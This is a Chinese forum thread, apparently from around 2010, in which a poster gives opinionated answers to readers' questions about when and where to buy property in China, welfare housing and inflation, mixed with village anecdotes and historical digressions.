确实是道光不是咸丰，笔误，特此道歉。 白莲教始于宋，最早可以追朔到南北朝时期，最早的名字叫\"白莲社\"。白莲教其实就是摩尼教，也就是倚天屠龙记里的明教，朱元璋靠白莲教得了天下，所以明代对白莲教的镇压异常残酷。清代的白莲教出现了许多分支，如八卦教、天地门教，先天教等等，总之白莲教从元代开始一直到清末都是闹得很凶的。 房产投资的几点建议 感谢大家的支持，不少朋友还提了一些关于房产投资的问题。 我觉得无论做什么样的投资，自己一定要做足功课。就房产来说，对于区域经济发展，要有深刻的理解，否则就不要轻易出手。 关于房产，我只是从大方向上说了一下自己的判断，并没有对区域的房产升值做过研究，所以没法给大家提供建议，请大家谅解。 不过，关于房产投资的方向，也有几点心得：供大家参考： 一、坚决不能投资自己不熟悉的城市 二、坚决不投资中小城市，一般省会及计划单列以上城市问题都不大，但中小城市即使房价上涨也存在变现困难问题。 三、坚决不投资距离大城市较偏远的旅游城市，比如山东乳山之类的，几乎无法变现。 四、慎重投资大城市的郊区，除非价格绝对低。如果外来人口比较多，zf又有发展规划，且价格与城区相比有较大的价差，才可以考虑 人民币对外升值，对内贬值 楼主，据sz的统计公布09年底的商品房存量4~5万套，33%左右的自由率，10年新建成面积在300万平米左右，应该不算泡沫吧？目前美元走强，人民币贬值会导致国外热钱以及权贵的钱逃走么？对房地产影响怎么看？ kkndme： 人民币对外是升值，对内贬值 南宁买房建议 showforme： LZ帮忙分析南宁的楼市情况，这边的房价均价是6000多，最近中央说要投资1.5万亿给广西发展北部湾经济，也许对南宁楼市有一定的刺激作用，我想近期买一套房自住+投资，现在入手合适还是等到年底合适？ kkndme： 自住+投资？ 自住房首要考虑的还是生活方便，不要太多考虑涨跌，没有意义，如果手里有钱就可以买。 南宁的房价我不清楚。但南宁是一个经济高速发展的城市是毋庸置疑的。 相对于昆明，南宁在面向东南亚贸易方面，有着更得天独厚的优势——港口。 经济适用房都是内部分配的 yjfsam： 看新闻说,在经济适用房里提供一定数量的廉租房,而不是大量廉租房,经济适用房是可以购买的,而且是建在市中心附近,如果是我,我当然是想买经济适用房,而廉租房又不多,这会不会跟楼主的意思有点不一样? 另外经济适用房在高价房附近推出,可以打压附近房价? kkndme： 你认为建在市中心附近的经济适用房是给普通老百姓建的吗？是低收入群众有资格购买的吗？ 经济适用房都是内部分配的，但一旦走进市场就可以牟取暴利了。 tjOOSAN： 大哥！！我真服你了。。。。。。 你知道 定向分配吗？？？就是只有拆迁户才有资格买的房子。不存在收入的问题！！ 你纯粹是胡诌啊！我发现 kkndme： 兄弟，你一直比较鸡栋，呵呵 拆迁户的定向房属于另外的问题，作为有产阶级的拆迁户来说，部分是城市扩大化的受益者，而部分又是受害者，不能一概而论。时机不同，城市不同，境遇也不同。 但是有一点可以肯定，拆迁的目的，不是为了拆迁户过得更好更舒服。开发商愿意支付高额的拆迁费（只限于超大型文明的城市，许多城市拆迁户的补偿是很可怜的）而是有更大的利润可图。 zf为主导建设的市中心经济适用房也不仅仅为了拆迁户回迁，拆迁户回迁比例最多占小区总放量的30%，而其余的基本上是权贵房 tjOOSAN： 我可不激动！就是闲的没事，来找事吧！还算是正事！ 你说的什么给权贵房，固然存在。但是比例太太少了！！你说的话，根本没有依据！ 现在买限价房的和经济适用房的人，都要在报纸上公布姓名和住址。 而且只要不是太穷的，基本都希望拆迁！因为第一，给的钱多。 第二 可以有定向分配。而且还是好地段的房子！！ kkndme： 兄弟你还是去了解一下体制内分福利房的真相吧。 福利房占用的都是经济适用房的指标啊 真正向社会公示的保障房才有多少呢？相对于数量庞大的福利房，可以说凤毛麟角。 不了解真相就没有发言权啊 特别是在二三线城市，房源比一线相对略为宽松，一个有点级别的公务员，通常都是分两三套房，这些房子占用的都是保障房的指标，都是要统计入保障房数据的。 不信你可以问问身边的公务员、银行员工、垄断企业员工。 tjOOSAN： 奥！你说的是，传说中的 国企员工啊！！ 可你一开始却说得是 经济适用房！是你搞错了把？ 国企员工分配房子的，也要够一定工龄！一定级别！不是谁都有的。好伐？ 而且 现在中国地产，很大一部分就是国企投资的。 所以叫内部分配么！！国企分房，在中国的体制内是正常的！ kkndme： 传说中的上海人？ 我没有搞错，体制内员工分配的福利房就是经济适用房。 我举个例子，昆明武警干部的福利房叫恒安新邻居，它的官方名称叫什么？ 我告诉你，叫做\"武警经济适用房小区\" 你看到的内部分房，占用的都是经济适用房的指标，也就是占用的是：我们所说的为了解决民生问题的保障房的指标。 tjOOSAN： kkndme 你认为建在市中心附近的经济适用房是给普通老百姓建的吗？是低收入群众有资格购买的吗？ 经济适用房都是内部分配的，但一旦走进市场就可以牟取暴利了。 这可是您自己的原话啊？？对吧？？ 市中心的经适，就是叫做定向分配。就是 在这附近拆迁的人，住的！！ 你非要说，有人谋私，我也不反对！但绝对不会多。 kkndme： 我估计是你理解错了，谋私和牟取暴利是两回事。 假设你是某市科级公务员，分到两套房子，以保障房的价格购买，但是却可以按照市场价格出售，只要一转手就可以进账几十万甚至上百万。 这就是分房双轨制给体制内有级别的员工带来的暴力机会。这跟谋私没有关系 tjOOSAN： 我觉得楼主拿经济适用房 做例子。很愚笨。 中国房价高起的根本原因，不就是国企，制造业资金进入地产么。 经济适用，现阶段就是为拆迁户盖得。 kkndme： 晕，也许你们上海是吧，放眼全国肯定不是 jellyoak： 上海今年以前根本没有过经济适用房，恰恰相反，上海是商品房最彻底的城市 给动迁户的叫动迁安置房，绝对都是建在最偏僻的地方的，最近5年基本上没有原拆原回的安置。 那位激动的同志有点多动症的嫌疑，忽略算了。 tjOOSAN： kkndme： 我估计是你理解错了，谋私和牟取暴利是两回事。 假设你是某市科级公务员，分到两套房子，以保障房的价格购买，但是却可以按照市场价格出售，只要一转手就可以进账几十万甚至上百万。 这就是分房双轨制给体制内有级别的员工带来的暴力机会。这跟谋私没有关系 你。。我不知道你说这个是什么意思？ 贪污腐败是少数。这是肯定存在的现象。但我现在讨论的是大众现象！ 而且内部分房的们都要够一定级别！就算他们一人分三套，那根本对楼市没有影响的 kkndme： 我说的是房产双轨制，是一种制度，不是说个人的以权谋私。 房屋问题实际上是土地问题，当一少部分人群能够以很低的代价占有更多的土地，市场上的土地就会变得稀缺，价格就会上升。 jellyoak： 可以说上海是最彻底的商品房市场化的城市。 没有小产权，没有福利分配，完全的市场化。 唯一的例外就是动迁户能分配到动迁安置房，虽然都是地处偏远但现在也都价值高昂。 lz说的那种公务员分配的安置房在很多城市是很普遍的。 情况绝非那位偏执狂TX所理解的 事实是庞大臃肿的公务员机构都有机会给这些公务员分配到一套住房，总数量很是惊人。 如果严控贷款的话，现在上海的房价是得不到长久支撑的。 看长期政策如何了。 现在没人相信贷款可以一直这样卡下去。 普通人怎么办：尽早买房，努力挣钱抵御通胀 被忽悠的群众： 楼主：我们P民怎么办呢？只有买房保住自己的社会地位！？ kkndme： 问题是房子将会是普通人越来越难以参与的游戏，门槛越来越高。 只有努力工作赚钱才是唯一能抵抗通胀的办法，这也是zf最希望看到的。 当然体制内员工，工资制度本身就可以抵御通胀。这些多发出来的钱是需要体制外广大群众创造出来的，因为体制内员工本身并不直接创造价值。 而体制外的广大群众要想抵御通胀，就必须努力工作，创造更大的价值来提高收入水平。 这也就是国家能够维持运转的根源所在啊 房价会出现很多上下波动 fengyu1218： 楼主，你所分析问题透彻明晰，很受启发 但是立足于将任何问题都用P民跟精英阶层对立的观点，我觉得有点绝对 社会阶层的复杂性，以及相互之间的博弈会在特定的阶段 有特定的表现形式，比如，当房价太高，P民阶层抗议不断的时候 会有所谓的调控出来，尽管成效不大 统治阶层也不会任由社会矛盾积累到最大程度而不作为 所以房价的表现形式会出现很多的上下波动 kkndme： 你说的对，房价趋势是上涨，但一定会有短期的波动 tjOOSAN： 而且对于你所标榜的\"暴涨\" 你自己后来也改了，是在波动中上涨！ 那还是暴涨吗？你都违背了自己的标题。 kkndme： 呵呵，短期的调控并不能改变长期上涨的趋势， 当资金的运作规律收到外力的压制，短暂低头的房价就会迎来暴涨。这是规律。 买房时机的选择（真TM厉害，这竟然是2010年的建议，可恨的是2020年才看到） 很多朋友都关心买房时机问题 对于自住需求者和投资需求者是要区别对待的 对于一线城市与二三线城市也是要区别对待的 对于自住需求者（仅指普通群众）来说，只要你还有钱能够买的起房，那你就买吧。 不要赌博和赌气，因为真的赌不起。 人人都可以买得起商品房，只是一个美丽的童话。 当然如果你赶上了国家调控的好时机，那你就要认真选房，做足功课，迅速出手。因为买到一套户型、位置、楼层都让你满意的房子，在商品房热销期，是很难的事情，根本没有给你挑选的机会，而在调控期，或许房价没怎么下降，但绝对给了你挑选的余地。 对于投资来说，问题就比较复杂，要考虑的问题就会更多，不同条件的人就有不同的需求。 总的来说在严厉调控期，需要关注以下几点： 一、当新盘的价格低于周边二手房的价格。 二、当看房的人不断增加 三、当kas拿地热情大减，以至于多处土地流拍 以上三点是提示你准备出手的信号。 对于一线城市，一定会有一段时期小幅下跌，及跌后滞涨。 对于二三线城市，多数城市会缓步持续上涨。但遇到大规模拆迁的城市，那房价就会忽视调控，选择快速上涨。近期，在二三线城市，无论自住还是投资，都是早买好于晚买。 收入分配改革跟体制外的人没关系 feifeilongdi： 请问楼主国家的收入分配改革调整的是哪一部分人的收入？ 我们底层p民如果真的连公租房都只能勉强供得起，那以后子女的抚养费用，夫妻以后的养老资金如何解决 kkndme： 工资收入分配改革应该只是个说法，对公有制经济是很有实惠的。但非公有制员工的工资是阳光雨露都撒不到的。 以前说涨工资基本都是公务员，收入分配改革后可能对事业单位及国企工资收入有明显改善。 至于体制外，无论打工仔和个体户都是自生自灭的 体制外的人要早早考虑养老问题 体制外人员养老确实是个问题 做生意的赚钱养老 聪明的下手早的以房养老 最惨的是没有混上去，且又没有特殊技能的私企打工仔。养老实在是个大问题。 所以东部地区才有宁挣老板1000元，不赚打工5000块的说法。 双轨制下，低层群众想翻身确实比较难。 永远不要和白痴争辩，因为他会把你的智商拉到和他同一水平，然后用丰富的经验打败你 鸡冻先生 能够有资格跟你辩论的一定只有两种人 一种是智商极高，世间罕见的 一种是智商比较低的。 其他人跟你辩论那是自找苦吃 当个农民也要懂政策，要顺政策而为 刚从深山老林钻出来，终于找到地方洗澡了，我激动啊。 洗完澡轻松，讲一个刚从支书那里听来的故事。 大家普遍感觉很穷的贵州省榕江县栽麻乡宰荡村，在解放前却是有名的富裕村，他们靠勤劳开垦荒地，良田多到种不过来，直到土改后，zf将宰荡的良田分给了加所、林所等周围几个土地较少的村子的村民（这些村子土地少的原因主要还是周围几个村子的村民比较懒惰，宁肯受穷也不愿意开垦荒地），宰荡才穷下来。 因为宰荡村过去比较富裕，拨给的富农指标就比较多。有一户人家很富裕，按理应该划为富农，但这户人家很了解政策，知道评上富农就会挨整，于是走关系，成分改成了中农。 而其他大多数依靠勤劳致富的人家非常老实，也不懂评为富农有什么不好，认为什么成分都无所谓，还不是老老实实干活。结果可想而知。当上了富农接下来就是没完没了的批斗。 这个故事告诉我们，哪怕当个农民也必须了解zf的意图。 存钱不如存资产，钱会贬值，资产会升值 去年在宰荡做了一段时间的田野调查，今年这次来算是回访。时过一年，发现去年村子附近的大多数农田，今年都变成了房子。 现在农民政策还是可以的，即使贫困如贵州山区，农民除了能够完全自给自足外，多余的粮食蔬菜也能换来一定的经济收入，随着家境变好了，对更大的房子的需求也就产生了，农民愿意把闲钱都用来盖成更大的房子，宁肯牺牲掉自有耕地。这其实是一件可怕的事情。 这次同样对村民做了入户调查，发现了一件有意思的事情。 村民最感到遗憾的事情就是早在2000年初，那时村里还没有电，村民为了想让全村通电，卖掉了所有山上的古树。电通了，当时的村民很高兴，而且认为古树卖了一个高价格（当时总共卖了6万块钱），换来了全村的生活方便。 大约在三年后，其他村寨，zf都给免费通了电。如果那些古树不卖掉，现在随便一颗的价格都超过了6万。现在那些古树至少值几百万。 村民们用最朴实无华的思想总结了一个道理：存钱不如存房子、存木头、存树 房子越早买越好，zf想钱想疯了 全国人民都知道有个以雷厉风行著称的球书记 球书记曾说过一段著名的话，大意是：昆明的开发商拿地价格很低，卖的价格却很高，腐败才是高房价根源。 当时昆明的很多无房户都很鸡冻，以为这下可好了，找到问题根源了，昆明房价要降了。 可是我听到的意思却是：zf卖地卖得太低了，应该大幅提高土地价格。 果然不久就出台了54321政策，以前拿地没走招拍挂程序的，一律按照54321补交土地款，否则开发商不发放任何证件，以至于升级到已买了房的业主也拿不到房产证。 于是昆明的新盘由于手续问题都无法开盘，已经卖掉很久的老盘，开发商还要求业主补交房款，否则退房。 结果可想而知，昆明的房价以一环与二环之间为例，由去年下半年的6000多涨到现在的均价过万。 如果从民生着想，会做出这样荒唐的事来吗。 帖子里有朋友问昆明的买房时机，我只能说越早买越好，因为dfzf想钱已经想疯了 利益才是zf行为的指挥棒 北大朱晓阳用了十多年时间跟踪昆明城中村，对刚刚建好5年的宏仁村就要因为商业利益而拆迁已经出离了愤怒，结果这事捅到CCAV曝光了，拆迁的事只好暂停。 利益才是zf行为的指挥棒 建议一定是建立在严肃考察的基础上 爱情就像跳恰恰： 这两天全部看完了，深受触动，楼主是个睿智的人，赞一个~ 想说下自己的情况，楼主帮我参谋一下，我在上海，女性，前几年由于一些特殊个人原因，导致一直没有自己的房子，这两年专注于事业，今年发展不错，进帐了260万左右，但是，通过几次看房，我发现 300万以内，已经找不到理想的房源！ 我现在是租住的市中心高档住房，每月租金 8500块，100个平米左右，这样的房子大概售价 500万左右，所以，现在的情况是 我想住的房子买不起，买的起的我也不想住~ 我本人对买房和租房没有太大感觉，从某种意义上说 我倒更喜欢租房，可以每两年换个区 换套新房住住 比较有新鲜感~但是，我手上也不想持有现金，由于物价上涨，通货膨胀，我觉得持有现金的风险也不小！ 不知道楼主对扬州的房产怎么看，我想放弃上海，到扬州购入房产，处于保值或者以后升值空间大后再售出，比如在市中心购入两三套高档小户型，用于出租！扬州由于地理优势，一两年后可能开通上海高铁，这样考虑在扬州安个家也不错，再置入一套生活便利的大点房子，以后可以考虑自住~ kkndme： 你的想法显然是经过深思熟虑的，在扬州买房子自住，花更少的钱过更舒适的生活很好啊，当然前提是你自己喜扬州这个城市。 说到投资，其实没人能够取代你自己的判断。我也没法给你提供究竟有多大升值空间的建议，因为建议一定是建立在严肃考察的基础上的。 我只能说东部地区的城市房产保值还是没问题的，但在哪个城市投资更好，确实需要认真实地考察。 如果从全国范围看，仅对投资而言，我比较看涨西安和重庆。但我个人不会在这两个城市买房子，因为本人不喜欢重庆的酷热和西安的气氛。 石家庄 楼主，请评价下石家庄的楼市，是暂时的价值洼地还是长期？ kkndme： 石家庄的地理和经济上的位置都比较尴尬。山西和天津都比石家庄有更好的优势 投资最重要的是稀缺性，买房首选公务员小区 说到买房子，无论投资还是自住，最重要的还是稀缺性，首选还是学区房。 自住最好买政府公务员小区，无论是商业配套，教育配套以及休闲娱乐配套都是商品房所无法比拟的。特别是商品房经过十几二十年，房子旧了，电梯很容易出故障，如果物业有问题或者小区里有人不交物业费，那么这个小区就很难住了。公务员小区则完全不用考虑房子老旧的问题，那都是zf包干到底的。 usstcai： 怎么找这种房源呢？ kkndme： 每个城市的情况不一样，北京基本上是单位的老公房，老计委的房，中石化的房都有上市交易的，但新房很难找。 至于二三线城市，现在还存在大量的公务员、垄断企业的新小区，并且很多房源都在市场上交易。比如昆明，存在大量的权贵小区，比如金江小区是省政府公务员小区，月牙塘小区是市政府公务员小区。 远离垃圾人 关于流氓无产者，在宰荡村子里还听了个故事 说很久以前的事情。 宰荡村民都很勤劳很淳朴。但是意外的出了一个叫罗老黑的人。 这个人好吃懒做无所事事，看见人家地里庄稼蔬菜长的好就跑去抢，为此挨过几次打。有一天罗老黑路上遇到个大兵，骗了大兵的枪，于是开始在村子里耀武扬威，不但抢人家辛辛苦苦种的菜，遇到单身的姑娘还动手动脚。 罗老黑在村里到处宣传他的逻辑：村里的庄稼、蔬菜、猪牛应该见者有份。 村里一些年轻人受了罗老黑的感染，开始变得好吃懒做，谁家种的东西都跑去拿。于是，村里人都不愿意劳动了，宰荡村开始变穷。 村里有个人很憎恨罗老黑的行为，但不敢明着跟王老黑作对，就在晚上在王老黑家放了一把火。侗族人住的房子都是杉木的，一旦一家着火，很可能全村遭殃，那把火烧了整个宰荡寨子，连青石板都烧裂了。 罗老黑，这个典型的流氓无产者，他的光荣事迹被当作反面教材激励着世世代代的宰荡村民。 高房价或许有天会崩盘，但你等不到那一天 zhuce010022： 不合理的制度不会永远的存在下去的。。。正如国父当年说的一句\"天下大势浩浩荡荡，顺之者昌，逆之者亡\"。。。 现在的高房价是目前中国的政治、经济结构失序造成的。 楼主上面分析了那么多，确实是，在目前这种局面下可能一直冲到崩是唯一的选择，但是，你怎么知道这种失序的大局面会一直持续下去呢？ kkndme： 一个朝代从鼎盛到衰亡至少维持个一两百年。所谓天下大势分久必合，合久必分，由合到分，总还是有个时间跨度的。 侥幸能在有生之年平平安安就是最大的福气，身死之后，哪管洪水滔天 房子不仅要早买，而且有能力的话不要怕压力，争取一步到位 傻子也疯狂： 楼主 你好 跟你的帖子已经两晚上了，还是没看完 不过已经到第六页了，我会继续跟下去 感觉你分析很有道理，也很深奥 以前在一个炒房人的终极预测也看到过类似的帖子 慢慢的也有所感悟 现在想请教你个问题，也是我自己面临的问题 人在深圳，想趁今年调控在武汉买套房子，因为有回武汉发展的想法 我毕业三年，收入不高，目前可能首付都不够（40万总价我想付10--15万，别笑我无能）总是在想是等我存够了首付再回去看房子还是现在就订下来，订下来吧钱不够，可能要问朋友借点，既要还债又要月供怕压力大，如果先不买等存够钱我怕那时候房价又上去了，所以想你帮我参考参考，给点建议，谢谢，诚信请教 另外，我和我女朋友月总收入8000左右，你觉得买总价40万的压力大吗 准备两年后结婚，再次感谢。 kkndme： 40万首付15万，贷款25万，月供1000多，你和女朋友月收入8000，你觉得有压力吗？ 二三线城市往往早买好于晚买，特别是你是自住。 40万的房子要不然是比较小的，要不然就是郊区了，如果你们有8000的月收入供60万的房子是不成问题的，建议不要图便宜，首选还是位置，宁可买贵点买离城中心近的房子，因为将来能够买得起改善性住房的会越来越少，有能力的话还是尽量买到位。要特别考虑今后小孩上学的配套问题。 傻子也疯狂： 楼主可能还不明白我的意思 我的首付目前也就10万 如果买大了首付要三成，按你说的卖60万的好是好 可首付至少要18万 我没有这么多怎么办呢 如果借钱，还债又月供，还要考虑两年后结婚。。。。。。。。 你觉得怎么办好，或者你有更好的建议 谢谢 kkndme： 如果只差8万，家里支持一些，亲戚朋友借一些，一挺就过去了。很多刚开始买房的年轻人都是要咬牙买的，换来以后的轻松。甚至很多人因为今后收入的提高，几年就把贷款还完了。 当然，如果真的凑不上，还是量力而行，但买房还是买位置，首选离城中心近的，宁可买小一点。住在远郊区的大房子里花1个多小时的时间上班才是受罪 金融杠杆是炒房赚钱的放大器 错误角色： 其实个人觉得普通炒房者不一定就能获多少利，比如他买一套新房是三千每平，等新房价到六千时出手，他能卖到五千每平。看上去他每平赚了二千…但是，他要继续炒的话，就要再加每平一千的本金进去买新房…看上去他们是资产翻翻了，但是他们的二次投资也是翻翻的…也就是说他以前三十万买了一百平，现在卖出去是五十万，看上去赚了二十万，但是，他想再买个一百平的却需要六十万…他还得从老本掏十万买同样大小的房子…这样算我也不知道对不对…要是对的话，就说明炒房的人不是抬高房价的最根本原因和最关键因素…… kkndme： 你没考虑金融杠杆的作用，真正的投机炒房是贷款炒房，而投资客更愿意一次性付清。一个炒房客用20万可以买100万的房子，等到200万卖掉，投入20多万，赚了170多万。然后用变现的钱又可以贷款买多套，这就是投机炒房比股市更吸引人的地方，但是一旦资金链断掉就会比较惨。 这种赌徒心态的投机炒客还是比较遭人恨的，这次调控提高首付比例，对这类投机炒家打击不小。小资金的纯粹投机客数量控制在一个比较小的范围内，房产市场才会健康发展，这个国家是有共识的。所以二套房首付比例提高后，有可能变成常态 tjOOSAN： 这话。。。让我肝颤！~~ 投入20万？赚170？？还贷了80万呢 还有利息呢！~~ kkndme： 09年初20万首付买的100万的房子，2010年初涨到200万卖掉，你认为1年能还多少利息。难道炒房客一套房子拿满20年再卖？ 要用发展的眼光看问题，只要努力，只会越来越好，越来越轻松 要用发展的眼光看问题，只要你还年轻，即使你现在给老板打工只能赚4000块，并不意味着以后多少年都只赚4000块，随着经验和阅历的增长，薪水是会提高的，当然前提是肯学习，肯吃苦，提高能力和才干。 性格决定命运 错误角色： 我只买得起4000元内100平的房子！哪怕住小点，住旧点…我也不愿意背着几十年的债度过我最美好的青年和中年时代、我更不愿意每天睁开眼就开始为了还房贷而奋斗。我不想短短的一辈子只是为了一堆只有七十年产权的砖瓦而奋斗。我只是一个平凡普通的人，我只想和老婆有一个快乐安逸的小家…但是\"家\"这个商品已经成了现在对我来说最昂贵的奢侈品。哈哈！ kkndme： 有一句话叫做怎么样付出就会怎么样的收获，看到许多人买房获利，另一些人坐不住了，心态变得鸡冻了，但是，当初人家咬牙买房的时候，另一些人还在追求所谓的生活品质。性格决定了命运 2012年不取消调控，还有房价维稳顺利换届考虑 zf希望房价维稳，为2012年换届后上涨留出空间，所以调控政策不会轻易取消，但是在高通胀预期的背景下，能不能稳住房价是很考验zf智慧的。 换届后的老板不可能去接一个烂摊子，这是关键的地方 洼地最终都会被填平，多数城市是早买胜于晚买 目前传言与辟谣越来越频繁，如何透过重重的迷雾看到事情背后的真相。 这次调控zy盯的主要还是一线城市，从提高首付比例，直到监管预售款的准备推出，都是为了提高房地产进入门槛，踢出大量小资金投资客，让小开发商民营开发商知难而退，为国家队入场铺路，zy需要稳定一线城市房价，使2012年能够顺利换届，为换届后的上涨留足空间。有了国家队的后盾，zy无需因为调控导致部分小开发商资金链断掉而担心，相反这是zy希望看到的。 当然在政策和市场的博弈中，是否能够达到zy的预期，zy的心理也不一定完全有底，因为资金有他自己内在的规律。在打压房地产的同时，会带来农产品等生活必须品的价格全面上涨，这就需要xy做出一个权衡。因为填饱肚子的问题比房价的问题更重要。 多数二三线城市会在一线城市滞涨期间进行补涨，补足09年行情中远低于一线城市的涨幅。 作为二三线城市的刚需买房者，多数城市的情况都是早买胜于晚买 西部 mstsc_XP： 楼主对成都的房子咋看？ kkndme： 在西部地区，重庆、西安、成都、昆明投资房产都不会有问题。西部的其他城市就要谨慎，不是因为房价不会涨，而是因为变现比较困难。 四川、重庆经济的高速发展是不容置疑的，但存在最大的隐忧就是三峡大坝对生态和环境的破坏根本无法预测。 短期波动属于正常现象，需要关注的是长期趋势 mobster6789 楼主的一番讲解真如拨云见日！ 但是本人认为，在目前基本面疲软的情况下，成交会进一步萎缩，房价在短期内也还有小规模下调的趋势，请楼主评议。 kkndme 短期的波动是再正常不过的事情，把握政策可以把握趋势，但很难做到准确的逃顶与抄底 领导人的智慧和才干决定了国家的命运，统帅的智慧和才干决定了军队的命运，而个人的智慧和才干决定了个人的命运 领导人的智慧和才干决定了国家的命运，统帅的智慧和才干决定了军队的命运，而个人的智慧和才干决定了个人的命运。 精英社会相对于法制社会存在更多的不稳定性，更崇尚个人能力、才干与职业精神，如果刘备只懂得眼泪是不可能得到三分天下的。 精英社会的根本就是以人治国，就是要承认人与人之间的差别。 百年战争，法国拥有全世界最强大的重骑士军团，可是由于统帅的无能，被英国长弓兵打得落花流水。 而耶路撒冷王国的鲍德温四世，一个年轻的麻风病人，率领几百个骑士打得萨拉丁三万马木流克骑兵溃不成军，几乎全军覆没。 一个人很可能决定一个国家的命运。 也许任何一个国家，甚至中国历史上任何一个朝代都没有象现在那样金权至上。 无论中国的儒家思想还是西方的骑士精神，都告诉人们，人总是要有所追求的，不能仅仅盯着钱。 秦时，有个老头叫郦食其，70多岁了还跑到刘邦大营参与革命，当然最后下场比较凄惨，被齐王煮了。郦老头本事很大，只身到齐国说服齐王归降了汉王刘邦。韩信害怕郦老头功劳太高，超过自己，于是很不仗义，在郦老头人还在齐国的时候，带兵攻打了齐国。齐王很愤怒，后果很严重，把郦老头放在锅里煮了。郦老头的才能出众，本想做一番事业，可惜没有算到人类本性丑恶的一面。 当然韩信也没有好下场，这个军事上的天才，政治上的白痴，本来做了齐王，汉、楚、齐三足鼎立，结果向刘邦缴了枪，直接兔死狗烹了。 另一个喜欢没事找事的老头叫姚广孝，是个和尚，法号道衍。虽是和尚，但既无和尚的慈悲心肠，又无和尚的遁世清修，这个老头专门搞权谋，不玩阳谋专玩阴谋，背靠朱棣这颗大树，不图名不图利，专搞武装夺取政权。 姚老头的头脑比郦老头高得多，不但是牛叉的阴谋家，也是牛叉的政治家，此人协助朱棣夺权后，深味帝王权术的精髓。不立家室，不营产业，把一脑袋阴谋全都转向文化事业，跟大才子解缙纂修《永乐大典》，是为数不多投身权谋得了好死的大师级人物 另一个喜欢没事找事的老头叫姚广孝，是个和尚，法号道衍。虽是和尚，但既无和尚的慈悲心肠，又无和尚的遁世清修，这个老头专门搞权谋，不玩阳谋专玩阴谋，背靠朱棣这颗大树，不图名不图利，专搞武装夺取政权。 姚老头的头脑比郦老头高得多，不但是牛叉的阴谋家，也是牛叉的政治家，此人协助朱棣夺权后，深味帝王权术的精髓。不立家室，不营产业，把一脑袋阴谋全都转向文化事业，跟大才子解缙纂修《永乐大典》，是为数不多投身权谋得了好死的大师级人物 打工不易： 我个人认为：个人的智慧来自对大方向的把握，否则再有才干也难有作为。 单位司机，工厂工人即便技术再好，工资也高不到哪去。 kkndme： 聪明智慧决定了人的眼界，有远见的人一定会未雨绸缪。刘邦身为区区亭长可以得天下，朱元璋一个穷和尚驱除鞑虏重建朝廷，一个司机未尝不能当富商，一个小姐也可能当局长 对于具备投资属性的商品，供求关系是指货币与商品之间的关系 关于供求关系还是有必要解释一下的 一提起供求关系，马上口水就来了，什么空置率啦，闲置率啦，空置我心啦，电表显示6000万套房没人住啦。 实际上供求关系跟空置率和闲置率完全没有关系。 对于具备投资属性的商品，供求关系是指货币与商品之间的关系。当货币量大于商品供应量时，商品价格就会上涨，即使人为打压也是短期行为，这是铁律。 早买的风险小于晚买 fantabulouski： 楼主给点意见吧，想在上海市内环内买套二手房，现在出手合适嘛？ 等等的话可能跌点么？有没有什么风险吗？ 多谢！ 因为首套房可以贷款七成，多谢！！ kkndme： 如果手头有钱，又是自住，到不一定非要考虑抄在最底部。 因为钱要贬值是毋庸置疑的，房价在一段较长时期上涨的趋势也是毋庸置疑的。 但短期，波段性的抄底和逃顶是很难把握的，尤其是自住，考虑太多实在没有意义。 持币要冒房价持续上涨的风险，买房可能会面临短暂小幅下跌，哪个风险更大，需要自己认真考虑。 一线城市如上海一定会有短期的滞涨甚至小幅的下跌，当新房的价格低于周边二手房价，并且成交量开始逐渐攀升就是买房的时机。 我反复强调，这次调控期却是二三线城市的补涨期，对于一线城市正好可以仔细的挑选好房，这种机会在房价上升期是难以遇到的。 fantabulouski： 楼主再问一个问题，看看这一两天调控的信息满天飞，上海房产税的消息也到处都是，银行在不断的紧缩，感觉这次调控可是不同以往，是外松内紧啊，至少到年底前看不到放松的迹象，还什么情况下才可能会放松呢？难道要等到KQ 接班不成？ kkndme： 可以肯定的是首付款的比例是不会轻易放松的。房产税的推出就没那么容易了。 上海和北京城区的二手房价有点幅度的下跌几乎不可能，很长一段时间都会滞涨或者维持小幅度的上涨。 手里资金多的人全款买房的比例大幅提高，精英阶层的购买力基本能够维持一线城市的正常的成交量（09年下半年的高成交量zy认为是反常的，已经影响了金融秩序，是zy不愿意看到的。） 现在的状况是，zy对调控后一线城市的房价增幅及成交量基本是满意的。 小开发商的房子能不能买？ mstsc_XP： 楼主的分析让我明白了很多之前误解的东西，所以自己错过了买房时机也是有一定道理的O(∩_∩)O哈哈~ 比如空置率、供求关系、当地房价和当地平均收入关系等的解释，非常感谢 想再请教一下，zy要挤出小开发商的话，到2012年，这些小开发商修的房子会不会烂尾?因为被挤出了，也不好好修了，或者干脆跑了.....因为我买的房子不是华润、中海这些有实力的开发商的楼.... kkndme： 如果不是经济危机，基本不会出现这种情况，当然排除个别不诚信的开发商 大兴土木搞建设的城市，房价都底不了 黛眉轻： LZ厉害，分析得很透彻。请教LZ，对于目前的合肥房价怎么看呢？做为皖江城市带的中心城市，合肥的房价目前中心城区已经到了7000，也有了超过万元的所谓豪宅。和武汉长沙比起来，经济上感觉合肥还是差的，可是房价却已经不差了。 kkndme： 凡是大兴土木积极拆迁的城市，房价都低不了，城市发展规划的资金都要得益于dfzf卖地。这是zf主导投资经济模式的必然结果。这也是二三线城市在这次调控中补涨的根本原因 北京老式砖混板楼的最终命运？ 汝爱之罪： 楼主我想请教一下：就是北京二三环甚至四环有不计其数的老式砖混板楼，年代分布从六七十年代到八十年代初的都有，这些房子都是北京城市发展的产物，也是北京留给土著们的天然福利，但是现在有个问题是它们的房龄已经超过30年奔着40,50去了，这些房子的命运如何呢？拆迁吗？在原址上盖回迁房或者重新规划把里面的居民赶到周围郊区？ 因为随着政策的收紧，这类房子越来越不容易流通了，银行不给贷款，升值空间也逐渐放缓，但是地段都非常好。是不是随着房龄的增加，这类房子只剩下保值功能而最终无法流通了呢？ 这批房子最终会大规模寿终正寝，不知道dfzf会怎么处置？很想听听你的看法。 kkndme： 这个情况比较复杂，因为大多数老房子是各大部委的单位房。原则还是谁的孩子谁包干，谁的孩子谁认领。所以说买房子买到公务员小区最保险，即使房子旧了也不会没人管，也不会存在物业跑路、小区沦为贫民窟的问题，即使老房子拆了单位盖了高楼，保证会在原址上还你一套。 至于说单位不行了或者单位不存在了的老公房也是有的，早晚会走拆迁的路子，那就没有原址回迁那么幸运了，肯定是搬到远郊区县，但补偿条件肯定不差，离开城中心到郊区就成了富翁。 位置决定了价值。北京郊区农民房拆迁补偿两万一平就算高的，但是城中心房屋拆迁，补偿款那都是10万一平起步的。愿意一掷千金全款买城中心老房子的人只会多不会少，说白了就是：哥买的不是房子，是位置。 welldayzwb： 现在貌似 